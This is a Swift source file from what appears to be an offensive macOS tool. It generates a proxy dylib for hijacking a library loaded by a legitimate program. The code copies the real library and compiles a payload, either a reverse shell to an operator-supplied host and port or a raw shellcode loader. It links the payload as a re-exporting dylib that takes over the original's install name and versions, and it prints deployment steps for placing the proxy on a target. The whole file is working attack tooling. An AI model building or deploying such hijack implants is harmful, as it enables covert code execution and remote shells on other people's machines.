import Foundation

// Generates a proxy (re-export) hijack dylib.
//
// A bare payload dylib dropped in place of a legitimately-loaded library makes
// the host crash: the symbols it linked against are gone. A proxy dylib avoids
// that by forwarding every symbol to a renamed copy of the real library via
// LC_REEXPORT_DYLIB, while still running the payload constructor. dyld only
// accepts the substitute if its compatibility_version satisfies what the host
// linked against, so the proxy is stamped with the original's versions.
//
// Deployment (operator, on target): place the proxy at the original library's
// path and the renamed real copy at the embedded reexport path.
class ProxyGenerator {

    // Toolchain pinned to the system paths; PATH may resolve to non-Apple shims.
    private static let clang = "/usr/bin/clang"
    private static let installNameTool = "/usr/bin/install_name_tool"
    private static let otool = "/usr/bin/otool"

    static func generate(
        from originalURL: URL,
        output outputURL: URL,
        payload: ExploitGenerator.PayloadType,
        reexportPathOverride: String?
    ) -> Bool {
        guard let info = MachOParser.parse(url: originalURL) else {
            print("Error: could not parse \(originalURL.path)")
            return false
        }
        guard let idCmd = info.loadCommands.first(where: { $0.type == .idDylib }) else {
            print("Error: \(originalURL.path) has no LC_ID_DYLIB — not a dylib, can't build a proxy.")
            return false
        }

        let originalInstallName = idCmd.path
        let currentVersion = idCmd.version?.currentVersionString ?? "0.0.0"
        let compatVersion = idCmd.version?.compatVersionString ?? "0.0.0"

        let outputDir = outputURL.deletingLastPathComponent()
        let originalBase = originalURL.deletingPathExtension().lastPathComponent
        let realCopyURL = outputDir.appendingPathComponent("\(originalBase).real.dylib")

        // The path the proxy's LC_REEXPORT_DYLIB will point at. Defaults to the
        // absolute location of the real copy (resolvable for local validation);
        // override to where the operator will stage the real lib on the target.
        let reexportPath = reexportPathOverride ?? realCopyURL.path

        // 1. Stage a copy of the real library for the operator to deploy at the
        //    reexport path. Its own install name is left untouched — dyld loads
        //    it by the path recorded in the proxy's LC_REEXPORT_DYLIB.
        try? FileManager.default.removeItem(at: realCopyURL)
        do {
            try FileManager.default.copyItem(at: originalURL, to: realCopyURL)
        } catch {
            print("Error: could not copy original to \(realCopyURL.path): \(error)")
            return false
        }

        // 2. Payload C — identical to a standalone payload dylib; the proxy
        //    behaviour comes entirely from the link step below.
        let cCode: String
        switch payload {
        case .reverseShell(let host, let port):
            cCode = ExploitGenerator.generateRevShellC(host: host, port: port)
        case .rawShellcode(let url):
            guard let data = try? Data(contentsOf: url) else {
                print("Error: could not read shellcode at \(url.path)")
                return false
            }
            cCode = ExploitGenerator.generateLoaderC(shellcode: data)
        }
        let cPath = outputURL.deletingPathExtension().appendingPathExtension("c")
        do {
            try cCode.write(to: cPath, atomically: true, encoding: .utf8)
        } catch {
            print("Error writing proxy C source: \(error)")
            return false
        }

        // 3. Link the proxy: forward all symbols to the real library and stamp
        //    matching versions. ld refuses to reexport a dylib that shares the
        //    output's install name, so build under a placeholder name and fix
        //    both the reexport target and the real id afterward.
        //    -headerpad_max_install_names guarantees room for longer paths.
        let placeholder = "@rpath/.callandor-proxy-placeholder.dylib"
        let (status, out) = run(clang, [
            "-dynamiclib",
            "-headerpad_max_install_names",
            "-current_version", currentVersion,
            "-compatibility_version", compatVersion,
            "-install_name", placeholder,
            "-Xlinker", "-reexport_library", "-Xlinker", originalURL.path,
            "-o", outputURL.path,
            cPath.path
        ])
        guard status == 0 else {
            print("Proxy compilation failed:\n\(out)")
            return false
        }

        // Repoint the reexport (recorded as the original's install name) to where
        // the real library will be staged, then claim the original's install name.
        let (chStatus, chOut) = run(installNameTool, ["-change", originalInstallName, reexportPath, outputURL.path])
        guard chStatus == 0 else {
            print("Error: install_name_tool -change failed:\n\(chOut)")
            return false
        }
        let (idStatus, idOut) = run(installNameTool, ["-id", originalInstallName, outputURL.path])
        guard idStatus == 0 else {
            print("Error: install_name_tool -id failed:\n\(idOut)")
            return false
        }

        print("Generated proxy dylib: \(outputURL.path)")
        print("  install name : \(originalInstallName)")
        print("  versions     : current \(currentVersion), compat \(compatVersion)")
        print("  reexports    : \(reexportPath)")
        print("  real copy    : \(realCopyURL.path)")
        print("")
        print("Deploy: place proxy at the original library path; place the real")
        print("copy at \(reexportPath)")

        // 4. Static validation harness — no execution (a runtime dlopen would
        //    detonate the payload; confirm at runtime only on the lab host).
        validate(
            proxy: outputURL,
            expectedReexport: reexportPath,
            expectedInstallName: originalInstallName,
            expectedCompat: compatVersion
        )
        writeValidationScript(proxy: outputURL, reexportPath: reexportPath, outputDir: outputDir, base: originalBase)

        return true
    }

    // MARK: - Validation

    private static func validate(
        proxy: URL,
        expectedReexport: String,
        expectedInstallName: String,
        expectedCompat: String
    ) {
        print("\n--- validation ---")
        let (_, dump) = run(otool, ["-l", proxy.path])

        let hasReexport = dump.contains("LC_REEXPORT_DYLIB") && dump.contains(expectedReexport)
        report("LC_REEXPORT_DYLIB → \(expectedReexport)", hasReexport)

        let hasInstallName = dump.contains("LC_ID_DYLIB") && dump.contains(expectedInstallName)
        report("LC_ID_DYLIB matches original install name", hasInstallName)

        // otool prints "compatibility version X.Y.Z" under the reexport/id entries.
        let compatOK = dump.contains("compatibility version \(expectedCompat)")
        report("compatibility_version \(expectedCompat) stamped", compatOK)
    }

    private static func report(_ label: String, _ ok: Bool) {
        print("  [\(ok ? "PASS" : "FAIL")] \(label)")
    }

    private static func writeValidationScript(proxy: URL, reexportPath: String, outputDir: URL, base: String) {
        let scriptURL = outputDir.appendingPathComponent("validate_\(base).sh")
        let script = """
        #!/bin/sh
        # Static validation for the proxy dylib. Does not execute the payload.
        # The proxy forwards the whole library via LC_REEXPORT_DYLIB, so its own
        # export trie is empty by design — symbols resolve from the staged real
        # library at the reexport path.
        set -e
        PROXY="\(proxy.path)"
        REAL="\(reexportPath)"
        echo "== proxy reexport / id / versions =="
        /usr/bin/otool -l "$PROXY" | grep -A4 -E 'LC_REEXPORT_DYLIB|LC_ID_DYLIB'
        echo "== real library staged at reexport path =="
        if [ -f "$REAL" ]; then
          echo "present: $REAL"
          echo "exports: $(/usr/bin/dyld_info -exports "$REAL" | grep -c '0x')"
        else
          echo "MISSING: $REAL  (stage the real library here before deploying)"
        fi
        """
        try? script.write(to: scriptURL, atomically: true, encoding: .utf8)
        try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: scriptURL.path)
        print("\nWrote validation script: \(scriptURL.path)")
    }

    // MARK: - Process helper

    private static func run(_ tool: String, _ args: [String]) -> (status: Int32, output: String) {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: tool)
        process.arguments = args
        let pipe = Pipe()
        process.standardOutput = pipe
        process.standardError = pipe
        do {
            try process.run()
        } catch {
            return (-1, "could not run \(tool): \(error)")
        }
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        return (process.terminationStatus, String(data: data, encoding: .utf8) ?? "")
    }
}
